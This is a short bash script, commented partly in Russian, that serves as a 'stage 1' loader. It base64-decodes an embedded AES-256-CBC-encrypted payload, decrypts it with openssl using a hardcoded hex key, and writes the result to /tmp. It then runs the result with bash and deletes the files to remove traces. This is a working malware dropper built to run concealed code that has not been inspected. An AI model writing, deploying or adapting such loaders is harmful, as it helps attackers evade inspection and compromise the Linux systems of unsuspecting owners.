#!/bin/bash
# AES-256-CBC decryptor template for Linux stage 1

PAYLOAD="a24ce759aa3b2b2cf4a12d8ee7edb22e:2cHuvbsE/08yYz+gvqpKpJiBlf8JZRCxp3syEjVm2Os3wOAdW6qq9LScQdNMaIviV9bl4HDX4DrDXfWAAymoidjZPe5JXZV3SVbgyc5swbcmepdlYSm206rll8NGsKN/C9BOFlDxSj4W+ZBvsuNvIYygeIYGhUqN22OASj+EnJYuprqi5uKteGLj4H4OzoE+RqrXC9QIrtCO1WVbUMQzGPCCjzsyudFjrwNa5edns+PV1Tn3yMpao4fodJx7M4UzelWBBJzFEB0In2UH4DCGVtNMUfmqzNn8cGafLJ6uzd3uP5vJQY9+W/TMAaxWwutl2z6x1va6SWWhHkhlWW7BEXXoqqBXHVEhM6AiPILIKljd6KsfL8KZxFpAv9C+MjOVdLvxM+XDLWiDlsJC1prcZKiY1+IYmfNLeCcVeEuxSLARHzBdv/ks8TOBCbybI7WHnmJaC35pSWgYNFBVXKpfSHkp/OLimbXLen8bqatZn64="  # encrypted ivhex:base64cipher, вставится на сборке
KEY="5a786376626e6d313233343536373839305a786376626e6d3132333435363738"      # AES ключ в HEX, совпадает с .env ENCRYPTION_KEY

iv=$(echo "$PAYLOAD" | cut -d: -f1)
cipher=$(echo "$PAYLOAD" | cut -d: -f2)

# Декодируем base64 в бинарник
echo "$cipher" | base64 -d > /tmp/cipher.bin

# Расшифровываем с помощью openssl (ключ уже в HEX, без конвертаций)
openssl enc -d -aes-256-cbc -K "$KEY" -iv "$iv" -in /tmp/cipher.bin -out /tmp/plaintext.sh

# Запускаем payload
bash /tmp/plaintext.sh

# Удаляем временные файлы
rm -f /tmp/cipher.bin /tmp/plaintext.sh
